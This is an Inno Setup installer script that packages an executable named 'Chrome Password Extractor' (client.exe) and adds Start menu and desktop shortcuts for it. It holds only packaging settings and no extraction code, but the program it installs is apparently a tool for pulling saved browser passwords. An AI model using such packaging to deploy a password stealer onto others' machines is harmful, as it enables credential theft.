[Setup]
AppName=Chrome Password Extractor
AppVersion=1.0
DefaultDirName={pf}\ChromePasswordExtractor
DefaultGroupName=Chrome Password Extractor
OutputDir=Output
OutputBaseFilename=password_extractor_setup

[Files]
Source: "dist\client.exe"; DestDir: "{app}"

[Icons]
Name: "{group}\Chrome Password Extractor"; Filename: "{app}\client.exe"
Name: "{commondesktop}\Chrome Password Extractor"; Filename: "{app}\client.exe"